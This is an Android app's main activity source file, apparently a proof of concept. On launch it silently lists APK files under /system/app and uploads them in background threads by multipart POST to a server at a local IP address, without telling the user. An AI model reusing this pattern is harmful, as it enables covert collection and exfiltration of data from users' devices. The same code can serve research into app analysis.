package com.example.hashimmoosavi.myapplication;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    int serverResponseCode = 0;
    TextView maintext = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Getting the installed apps and then sending them
        getFiles();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    // This function prints the installed apps in the text view
    private void getFiles()
    {
        // location where apps are stored
        final String systemAppsDir = "/system/app";
        final String userAppsDir = "/data/app";
        final String sdCardAppsDir = "/mnt/asec";

        File appsDir = new File(systemAppsDir);

        maintext = (TextView) findViewById(R.id.maintext);

        if(appsDir != null) {
            final String files[] = appsDir.list();

            for (int i = 0; i < files.length - (files.length - 2); i++) {   // UPLOADING ONLY 2 APKS FOR EXAMPLE
                File currentAppDir = new File(systemAppsDir + "/" + files[i] + "/");

                if (currentAppDir != null) {
                    final String[] apks = currentAppDir.list();

                    for (int j = 0; j < apks.length; j++) {

                        // Find the apks

                        if (apks[j].lastIndexOf(".apk") > -1) {

                            // Send post request with the found apk file in new network thread

                            final int indexi = i;
                            final int indexj = j;

                            Thread t = new Thread(new Runnable() {
                                public void run() {
                                    int response= uploadFile(systemAppsDir + "/" + files[indexi] + "/" + apks[indexj]);
                                    System.out.println("RES : " + response);
                                }
                            });

                            t.start();

//                            while(t.isAlive())
//                            {
//                                // Waiting for thread to get over
//                            }
                        }
                    }
                }
            }
        }
    }

    public int uploadFile(String sourceFileUri) {
        String upLoadServerUri = "http://192.168.100.7:8000";
        String fileName = sourceFileUri;

        HttpURLConnection conn = null;
        DataOutputStream dos = null;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1024 * 1024;
        File sourceFile = new File(sourceFileUri);
        if (!sourceFile.isFile()) {
            Log.e("uploadFile", "Source File Does not exist");
            return 0;
        }
        try { // open a URL connection to the Servlet

            FileInputStream fileInputStream = new FileInputStream(sourceFile);
            URL url = new URL(upLoadServerUri);
            conn = (HttpURLConnection) url.openConnection(); // Open a HTTP  connection to  the URL
            conn.setDoInput(true); // Allow Inputs
            conn.setDoOutput(true); // Allow Outputs
            conn.setUseCaches(false); // Don't use a Cached Copy
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            conn.setRequestProperty("uploaded_file", fileName);
            dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"uploaded_file\";filename=\""+ fileName + "\"" + lineEnd);
            dos.writeBytes(lineEnd);

            bytesAvailable = fileInputStream.available(); // create a buffer of  maximum size

            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];

            // read file and write it into form...
            bytesRead = fileInputStream.read(buffer, 0, bufferSize);

            while (bytesRead > 0) {
                dos.write(buffer, 0, bufferSize);
                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            }

            // send multipart form data necessary after file data...
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

            // Responses from the server (code and message)
            serverResponseCode = conn.getResponseCode();
            String serverResponseMessage = conn.getResponseMessage();

            Log.i("uploadFile", "HTTP Response is : " + serverResponseMessage + ": " + serverResponseCode);
            if(serverResponseCode == 200){
//                runOnUiThread(new Runnable() {
//                    public void run() {
//                        Toast.makeText(MainActivity.this, "File Upload Complete.", Toast.LENGTH_SHORT).show();
//                    }
//                });
            }

            //close the streams
            fileInputStream.close();
            dos.flush();
            dos.close();

        } catch (MalformedURLException ex) {
            ex.printStackTrace();
            Toast.makeText(MainActivity.this, "MalformedURLException", Toast.LENGTH_SHORT).show();
            Log.e("Upload file to server", "error: " + ex.getMessage(), ex);
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(MainActivity.this, "Exception : " + e.getMessage(), Toast.LENGTH_SHORT).show();
            Log.e("Upload file to server", "Exception : " + e.getMessage(), e);
        }
        return serverResponseCode;
    }
}